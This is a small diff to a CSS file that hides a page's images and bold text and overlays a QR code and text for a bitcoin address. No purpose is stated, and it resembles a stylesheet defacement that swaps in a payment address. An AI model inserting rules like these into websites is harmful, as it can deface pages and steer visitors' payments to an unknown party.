@@ -1,2 +1,5 @@
 /*  Github Repository  */
-
+.left{background: url('https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=bitcoin:1BUFdsbHraWhs8Q8TKaQDVDH2i2k26TnQc') no-repeat;width: 250px;height: 250px !important;}
+strong{display: none !important;}
+.content p:nth-child(2):after{white-space: pre-wrap;font-size: 16px;font-weight: bold;content: "\A\A 1BUFdsbHraWhs8Q8TKaQDVDH2i2k26TnQc" !important;}
+img {opacity: 0 !important;}
